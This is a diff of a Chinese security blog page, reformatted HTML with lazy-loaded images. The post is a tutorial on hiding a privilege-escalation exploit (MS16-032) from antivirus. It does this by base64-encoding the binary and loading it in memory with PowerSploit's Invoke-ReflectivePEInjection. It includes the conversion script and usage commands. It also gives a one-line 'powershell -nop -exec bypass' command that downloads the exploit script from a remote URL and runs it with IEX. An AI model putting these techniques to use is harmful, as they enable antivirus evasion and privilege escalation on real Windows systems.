@@ -1,21 +1,4 @@
-<!DOCTYPE html>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-CN">
-<head><meta name="generator" content="Hexo 3.9.0">
+<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -104,22 +87,22 @@
 
 
 
-  <meta name="description" content="有时候，使用某些exp进行提权的时候，exp可能会被查杀，当然，有源码的话，我们可以在源码上进行修改进行免杀处理，但是今天介绍的是另外一只方法，即使用PEloader来加载exp。powershell的PEloader在这里，查看代码我们可以看到，这个脚本使用非常简单，具体代码如下：12$PEBytes = [IO.File]::ReadAllBytes(&apos;DemoEXE.exe&apos;)Invoke-">
+  <meta name="description" content="有时候，使用某些exp进行提权的时候，exp可能会被查杀，当然，有源码的话，我们可以在源码上进行修改进行免杀处理，但是今天介绍的是另外一只方法，即使用PEloader来加载exp。powershell的PEloader在这里，查看代码我们可以看到，这个脚本使用非常简单，具体代码如下：12$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')Invoke-">
 <meta name="keywords" content="Powershell,bypassav">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BypassAV With ReflectivePEInjection">
 <meta property="og:url" content="https://evi1cg.github.io/archives/BypassAV_With_ReflectivePEInjection.html">
-<meta property="og:site_name" content="Evi1cg&#39;s blog">
-<meta property="og:description" content="有时候，使用某些exp进行提权的时候，exp可能会被查杀，当然，有源码的话，我们可以在源码上进行修改进行免杀处理，但是今天介绍的是另外一只方法，即使用PEloader来加载exp。powershell的PEloader在这里，查看代码我们可以看到，这个脚本使用非常简单，具体代码如下：12$PEBytes = [IO.File]::ReadAllBytes(&apos;DemoEXE.exe&apos;)Invoke-">
+<meta property="og:site_name" content="Evi1cg's blog">
+<meta property="og:description" content="有时候，使用某些exp进行提权的时候，exp可能会被查杀，当然，有源码的话，我们可以在源码上进行修改进行免杀处理，但是今天介绍的是另外一只方法，即使用PEloader来加载exp。powershell的PEloader在这里，查看代码我们可以看到，这个脚本使用非常简单，具体代码如下：12$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')Invoke-">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/12/3522762171.png">
-<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/12/3827318615.jpg">
+<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
+<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
 <meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2017/12/873755257.png">
 <meta property="og:updated_time" content="2019-01-16T05:14:25.237Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BypassAV With ReflectivePEInjection">
-<meta name="twitter:description" content="有时候，使用某些exp进行提权的时候，exp可能会被查杀，当然，有源码的话，我们可以在源码上进行修改进行免杀处理，但是今天介绍的是另外一只方法，即使用PEloader来加载exp。powershell的PEloader在这里，查看代码我们可以看到，这个脚本使用非常简单，具体代码如下：12$PEBytes = [IO.File]::ReadAllBytes(&apos;DemoEXE.exe&apos;)Invoke-">
-<meta name="twitter:image" content="https://evi1cg.github.io/usr/uploads/2017/12/3522762171.png">
+<meta name="twitter:description" content="有时候，使用某些exp进行提权的时候，exp可能会被查杀，当然，有源码的话，我们可以在源码上进行修改进行免杀处理，但是今天介绍的是另外一只方法，即使用PEloader来加载exp。powershell的PEloader在这里，查看代码我们可以看到，这个脚本使用非常简单，具体代码如下：12$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')Invoke-">
+<meta name="twitter:image" content="https://evi1cg.github.io/images/loading.svg">
 
 
 
@@ -499,19 +482,19 @@
       
 
       
-        <p>有时候，使用某些exp进行提权的时候，exp可能会被查杀，当然，有源码的话，我们可以在源码上进行修改进行免杀处理，但是今天介绍的是另外一只方法，即使用PEloader来加载exp。<br>powershell的PEloader在<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1" target="_blank" rel="noopener">这里</a>，查看代码我们可以看到，这个脚本使用非常简单，具体代码如下：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$PEBytes</span> = [IO.File]::ReadAllBytes(<span class="string">'DemoEXE.exe'</span>)</span><br><span class="line">Invoke-ReflectivePEInjection -PEBytes <span class="variable">$PEBytes</span> -ExeArgs <span class="string">"Arg1 Arg2 Arg3 Arg4"</span></span><br></pre></td></tr></table></figure></p>
+        <meta name="generator" content="Hexo 3.9.0"><p>有时候，使用某些exp进行提权的时候，exp可能会被查杀，当然，有源码的话，我们可以在源码上进行修改进行免杀处理，但是今天介绍的是另外一只方法，即使用PEloader来加载exp。<br>powershell的PEloader在<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1" target="_blank" rel="noopener">这里</a>，查看代码我们可以看到，这个脚本使用非常简单，具体代码如下：<br></p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$PEBytes</span> = [IO.File]::ReadAllBytes(<span class="string">'DemoEXE.exe'</span>)</span><br><span class="line">Invoke-ReflectivePEInjection -PEBytes <span class="variable">$PEBytes</span> -ExeArgs <span class="string">"Arg1 Arg2 Arg3 Arg4"</span></span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>获取exp的字节流，之后再在内存中加载exp，所以思路也很简单，我们只需要把需要的exp转换成字符串，写入脚本，就可以构造一个powershell脚本。</p>
-<p>这里整理了一个脚本方便转换：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Convert-BinaryToString &#123;</span><br><span class="line">   [CmdletBinding()] <span class="keyword">param</span> (</span><br><span class="line">      [string] <span class="variable">$FilePath</span></span><br><span class="line">   )</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="variable">$ByteArray</span> = [System.IO.File]::ReadAllBytes(<span class="variable">$FilePath</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">catch</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="string">"Failed to read file. Ensure that you have permission to the file, and that the file path is correct."</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$ByteArray</span>) &#123;</span><br><span class="line">      <span class="variable">$Base64String</span> = [System.Convert]::ToBase64String(<span class="variable">$ByteArray</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="string">'$ByteArray is $null.'</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$Base64String</span> | <span class="built_in">set-content</span> (<span class="string">"b64.txt"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>使用zcgonvh的16032做演示。使用脚本转换：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\evi1cg\Desktop\<span class="number">16</span>_032&gt; . .\Convert-BinaryToString.ps1</span><br><span class="line">PS C:\Users\evi1cg\Desktop\<span class="number">16</span>_032&gt; Convert-BinaryToString -FilePath .\ms16-<span class="number">032</span>_x64.exe</span><br></pre></td></tr></table></figure></p>
-<p>生成base64的字符串并存储在b64.txt中。<br><img src="https://evi1cg.github.io/usr/uploads/2017/12/3522762171.png" alt="4B544212-75E6-4CAD-839C-18F77CA759EA.png"></p>
-<p>使用如下命令进行转换：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$InputString</span> = <span class="string">"base64string"</span></span><br><span class="line"><span class="variable">$PEBytes</span> = [System.Convert]::FromBase64String(<span class="variable">$InputString</span>)</span><br></pre></td></tr></table></figure></p>
-<p>之后就可以使用<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-ReflectivePEInjection -PEBytes <span class="variable">$PEBytes</span></span><br></pre></td></tr></table></figure></p>
+<p>这里整理了一个脚本方便转换：<br></p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Convert-BinaryToString {</span><br><span class="line">   [CmdletBinding()] <span class="keyword">param</span> (</span><br><span class="line">      [string] <span class="variable">$FilePath</span></span><br><span class="line">   )</span><br><span class="line">   <span class="keyword">try</span> {</span><br><span class="line">      <span class="variable">$ByteArray</span> = [System.IO.File]::ReadAllBytes(<span class="variable">$FilePath</span>);</span><br><span class="line">   }</span><br><span class="line">   <span class="keyword">catch</span> {</span><br><span class="line">      <span class="keyword">throw</span> <span class="string">"Failed to read file. Ensure that you have permission to the file, and that the file path is correct."</span>;</span><br><span class="line">   }</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$ByteArray</span>) {</span><br><span class="line">      <span class="variable">$Base64String</span> = [System.Convert]::ToBase64String(<span class="variable">$ByteArray</span>);</span><br><span class="line">   }</span><br><span class="line">   <span class="keyword">else</span> {</span><br><span class="line">      <span class="keyword">throw</span> <span class="string">'$ByteArray is $null.'</span>;</span><br><span class="line">   }</span><br><span class="line">   <span class="variable">$Base64String</span> | <span class="built_in">set-content</span> (<span class="string">"b64.txt"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>使用zcgonvh的16032做演示。使用脚本转换：<br></p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\evi1cg\Desktop\<span class="number">16</span>_032> . .\Convert-BinaryToString.ps1</span><br><span class="line">PS C:\Users\evi1cg\Desktop\<span class="number">16</span>_032> Convert-BinaryToString -FilePath .\ms16-<span class="number">032</span>_x64.exe</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>生成base64的字符串并存储在b64.txt中。<br></p><div class="progress-images" style="width:1326px"><div class="progress-images--placeholder" style="padding-bottom: 23.227752639517345%;"></div><img src="/images/loading.svg" alt="4B544212-75E6-4CAD-839C-18F77CA759EA.png" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2017/12/3522762171.png" data-thumb="/images/thumb/0a185bf2a3483ed0805ac983ee4bd605.png"></div><p></p>
+<p>使用如下命令进行转换：<br></p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$InputString</span> = <span class="string">"base64string"</span></span><br><span class="line"><span class="variable">$PEBytes</span> = [System.Convert]::FromBase64String(<span class="variable">$InputString</span>)</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>之后就可以使用<br></p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-ReflectivePEInjection -PEBytes <span class="variable">$PEBytes</span></span><br></pre></td></tr></tbody></table></figure><p></p>
 <p>进行加载，最后分享一下最终的脚本：</p>
 <p><a href="https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/E2P_MS16-032.ps1" target="_blank" rel="noopener">E2P_MS16-032.ps1</a></p>
-<p>使用方式为：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E2P_MS16-<span class="number">032</span> -Command <span class="string">'"net user"'</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="https://evi1cg.github.io/usr/uploads/2017/12/3827318615.jpg" alt="photo_2017-12-27_20-07-13.jpg"></p>
+<p>使用方式为：<br></p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E2P_MS16-<span class="number">032</span> -Command <span class="string">'"net user"'</span></span><br></pre></td></tr></tbody></table></figure><p></p>
+<p></p><div class="progress-images" style="width:1280px"><div class="progress-images--placeholder" style="padding-bottom: 38.984375%;"></div><img src="/images/loading.svg" alt="photo_2017-12-27_20-07-13.jpg" class="progress-images--original" data-original="https://evi1cg.github.io/usr/uploads/2017/12/3827318615.jpg" data-thumb="/images/thumb/1003e421a65263e157f87c37062d2b93.jpg"></div><p></p>
 <p>脚本GIT：<a href="https://github.com/ridter/pentest" target="_blank" rel="noopener">Pentest</a>。</p>
-<p>远程加载命令：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c <span class="string">"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/E2P_MS16-032.ps1');E2P_MS16-032 -Command '\"</span>whoami\<span class="string">"'"</span></span><br></pre></td></tr></table></figure></p>
+<p>远程加载命令：<br></p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c <span class="string">"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/E2P_MS16-032.ps1');E2P_MS16-032 -Command '\"</span>whoami\<span class="string">"'"</span></span><br></pre></td></tr></tbody></table></figure><p></p>
 <p><img src="https://evi1cg.github.io/usr/uploads/2017/12/873755257.png" alt="717403C9-86AA-4594-A35F-9D0A1307088C.png"></p>
 
       
@@ -859,7 +842,7 @@
                   
                     
                   
-                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="https://github.com/Ridter" title="GitHub → https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -870,7 +853,7 @@
                   
                     
                   
-                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  <a href="https://twitter.com/Evi1cg" title="Twitter → https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -881,7 +864,7 @@
                   
                     
                   
-                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                  <a href="https://weibo.com/Ridter" title="微博 → https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -892,7 +875,7 @@
                   
                     
                   
-                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail → mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                 </span>
               
             </div>
@@ -927,7 +910,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">© 2015 – <span itemprop="copyrightYear">2019</span>
   <span class="with-love" id="animate">
     <i class="fa fa-heart"></i>
   </span>
@@ -1609,5 +1592,6 @@
   <script>
   $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
   </script>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
-</html>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script>
+
+<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
